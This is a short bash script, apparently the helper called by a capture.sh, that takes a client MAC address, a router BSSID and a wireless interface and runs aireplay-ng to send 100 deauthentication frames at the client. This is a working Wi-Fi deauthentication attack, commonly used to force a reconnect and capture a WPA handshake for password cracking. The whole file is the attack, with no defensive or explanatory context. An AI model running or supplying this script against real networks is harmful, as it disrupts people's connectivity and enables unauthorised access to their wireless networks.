#!/bin/bash

# Arguments passed from capture.sh
CLIENT_MAC=$1
ROUTER_BSSID=$2
INTERFACE=$3

# Run aireplay-ng to deauthenticate the client
sudo aireplay-ng --deauth 100 -a $ROUTER_BSSID -c $CLIENT_MAC $INTERFACE
